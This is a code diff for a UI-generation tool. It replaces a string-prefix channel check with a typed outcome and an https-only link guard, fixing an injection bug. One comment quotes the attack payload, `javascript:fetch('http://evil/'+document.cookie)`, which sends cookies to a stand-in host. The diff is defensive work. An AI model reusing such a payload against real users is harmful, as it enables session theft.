@@ -6,7 +6,8 @@ import { FAILURE_MESSAGES, failureLogDetail } from "../http/failure.js";
 import type { BrowserDetector } from "../browser/detector.js";
 import type { Logger } from "../logger.js";
 import type { Config } from "../config.js";
-import { CallbackServer } from "../callback/callback-server.js";
+import { CallbackServer, payloadSnippet } from "../callback/callback-server.js";
+import type { CallbackPayload } from "../callback/callback-payload.js";
 import { CorsHandler } from "../callback/cors.js";
 import { RateLimiter } from "../security/rate-limiter.js";
 import { ShellSanitizer } from "../security/shell-sanitizer.js";
@@ -40,6 +41,53 @@ const createUiSchema = z.object({
 type FileReadOutcome =
   | { readonly ok: true; readonly content: string }
   | { readonly ok: false; readonly reason: string };
+
+/**
+ * What the browser leg produced: a validated callback payload, or a URL for the
+ * user to open by hand (design.md `## Fix Approach 4`, item 4).
+ *
+ * THE DEFECT THIS REPLACES. Both answers used to travel as one `string`, and
+ * the caller told them apart by testing that string's own opening characters
+ * against a sentinel prefix — the value deciding its own channel. Measured
+ * 2026-08-12: a callback body that opened with that prefix and continued
+ * `javascript:fetch('http://evil/'+document.cookie)` reached the agent as
+ * `[Open 21st.dev Magic Chat](javascript:fetch(…))`. The prefix itself is
+ * deliberately not written anywhere in this directory any more; it survives
+ * only as a hostile INPUT in `__tests__/tools/create-ui.channel.test.ts`.
+ *
+ * The discriminator is now a field this code writes, and `manual` is
+ * constructed in exactly one place — the branch where `openUrl` returned false
+ * — from a URL this process built. Nothing arriving over the socket can reach
+ * that branch, whatever it spells (R4.4). Renaming the prefix, escaping it or
+ * checking it more carefully would each have left the decision inside the data;
+ * only separating the channels removes it.
+ *
+ * It lives here beside `FileReadOutcome` because it is this tool's own control
+ * flow: `tryBrowserCallback` is its only producer and `execute` its only
+ * consumer. `CallbackPayload` — the part that genuinely crosses a boundary — is
+ * the one piece imported from `src/callback/`.
+ */
+type BrowserOutcome =
+  | { readonly kind: "opened"; readonly payload: CallbackPayload }
+  | { readonly kind: "manual"; readonly url: string };
+
+/**
+ * R4.5: a URL is offered to the caller only if it is `https`.
+ *
+ * Not redundant with `ShellSanitizer.sanitizeUrl`, which admits `http:` as well
+ * — its subject is shell metacharacters, not transport. Stating the rule where
+ * the link is BUILT keeps it checkable here rather than inferred from a helper
+ * two files away, and makes the guarantee hold for whatever the URL is derived
+ * from later. A string that is not a URL at all parses as neither and is
+ * refused by the same branch.
+ */
+function isHttpsUrl(candidate: string): boolean {
+  try {
+    return new URL(candidate).protocol === "https:";
+  } catch {
+    return false;
+  }
+}
 
 export interface CreateUiToolDeps {
   httpClient: HttpClient;
@@ -77,39 +125,18 @@ After calling this tool, you must edit or add files to integrate the snippet int
     this.logger.debug(`Query: ${standaloneRequestQuery}`);
 
     // Try browser + callback first
-    const browserResult = await this.tryBrowserCallback(standaloneRequestQuery);
+    const outcome = await this.tryBrowserCallback(standaloneRequestQuery);
 
-    if (browserResult) {
-      // Check if it's a URL for manual opening
-      if (browserResult.startsWith("BROWSER_URL:")) {
-        const url = browserResult.replace("BROWSER_URL:", "");
-        this.logger.warn(`Browser could not be opened automatically`);
-
-        // Fall back to API but include the URL in case user wants to browse
-        const apiResult = await this.fallbackToApi(message, searchQuery, absolutePathToCurrentFile);
-
-        // A failure is returned as itself. Rebuilding the response by hand below
-        // drops `isError`, which is how a refusal would reach the caller looking
-        // like a successful result; it would also splice markdown into
-        // `formatError`'s JSON payload and leave it unparseable.
-        if (apiResult.isError) {
-          return apiResult;
-        }
-
-        // Prepend URL info to the response
-        const urlInfo = `\n\n---\n**Browse components visually:** [Open 21st.dev Magic Chat](${url})\n---\n\n`;
-        return {
-          content: [{
-            type: "text" as const,
-            text: urlInfo + apiResult.content[0].text,
-          }],
-        };
+    // The channel is read off `kind`, a field this process wrote, so no branch
+    // below can be chosen by the content of a callback body (R4.4).
+    if (outcome !== null) {
+      switch (outcome.kind) {
+        case "manual":
+          return this.withManualLink(outcome.url, message, searchQuery, absolutePathToCurrentFile);
+        case "opened":
+          this.logger.info(`Got result from browser callback`);
+          return this.componentResponse(outcome.payload);
       }
-
-      this.logger.info(`Got result from browser callback`);
-      return {
-        content: [{ type: "text" as const, text: this.formatResponse(browserResult) }],
-      };
     }
 
     // Fallback to direct API
@@ -117,13 +144,61 @@ After calling this tool, you must edit or add files to integrate the snippet int
     return this.fallbackToApi(message, searchQuery, absolutePathToCurrentFile);
   }
 
-  private async tryBrowserCallback(query: string): Promise<string | null> {
+  /**
+   * A callback result, rendered exactly as the API path renders its own text.
+   *
+   * The payload's CONTENT, never the payload. Handing the structure on serializes
+   * this project's own envelope into the agent's answer — measured 2026-08-12,
+   * `{"text":"export const Card = () => <div/>;"}` where the snippet belonged.
+   * The two paths agree on what a result is because both end at `formatResponse`.
+   */
+  private componentResponse(payload: CallbackPayload): ToolResponse {
+    return {
+      content: [{ type: "text" as const, text: this.formatResponse(payloadSnippet(payload)) }],
+    };
+  }
+
+  /**
+   * The API answer, with the link the user can open by hand above it.
+   *
+   * `url` is always one this process built and passed to `openUrl`: it reaches
+   * here only through `BrowserOutcome.manual`, which nothing remote can
+   * construct, and which is gated on `https` (R4.5).
+   */
+  private async withManualLink(
+    url: string,
+    message: string,
+    searchQuery: string,
+    absolutePathToCurrentFile: string
+  ): Promise<ToolResponse> {
+    const apiResult = await this.fallbackToApi(message, searchQuery, absolutePathToCurrentFile);
+
+    // A failure is returned as itself. Rebuilding the response by hand below
+    // drops `isError`, which is how a refusal would reach the caller looking
+    // like a successful result; it would also splice markdown into
+    // `formatError`'s JSON payload and leave it unparseable.
+    if (apiResult.isError) {
+      return apiResult;
+    }
+
+    // Prepend URL info to the response
+    const urlInfo = `\n\n---\n**Browse components visually:** [Open 21st.dev Magic Chat](${url})\n---\n\n`;
+    return {
+      content: [{
+        type: "text" as const,
+        text: urlInfo + apiResult.content[0].text,
+      }],
+    };
+  }
+
+  private async tryBrowserCallback(query: string): Promise<BrowserOutcome | null> {
     try {
       const server = new CallbackServer({
         maxBodySize: this.config.maxBodySize,
         cors: CorsHandler,
         rateLimiter: new RateLimiter(),
         logger: this.logger,
+        allowLocalhostOrigin: this.config.allowLocalhostOrigin,
       });
       const port = await server.start();
       this.logger.debug(`Callback server started on port ${port}`);
@@ -142,9 +217,16 @@ After calling this tool, you must edit or add files to integrate the snippet int
       const browserOpened = await this.browserDetector.openUrl(url);
 
       if (!browserOpened) {
-        this.logger.warn(`Could not open browser, please open manually: ${url}`);
         server.cancel();
-        return `BROWSER_URL:${url}`;
+        if (!isHttpsUrl(url)) {
+          // Cannot happen while the URL above is built from an `https` literal;
+          // it is refused rather than trusted so the guarantee holds by
+          // construction instead of by reading the line that builds it.
+          this.logger.warn(`Refusing to offer a manual link for a non-https URL: ${url}`);
+          return null;
+        }
+        this.logger.warn(`Could not open browser, please open manually: ${url}`);
+        return { kind: "manual", url };
       }
 
       this.logger.debug(`Browser opened, waiting for callback...`);
@@ -155,7 +237,7 @@ After calling this tool, you must edit or add files to integrate the snippet int
         return null;
       }
 
-      return result.data;
+      return { kind: "opened", payload: result.payload };
     } catch (error) {
       this.logger.error(`Browser callback error:`, error);
       return null;
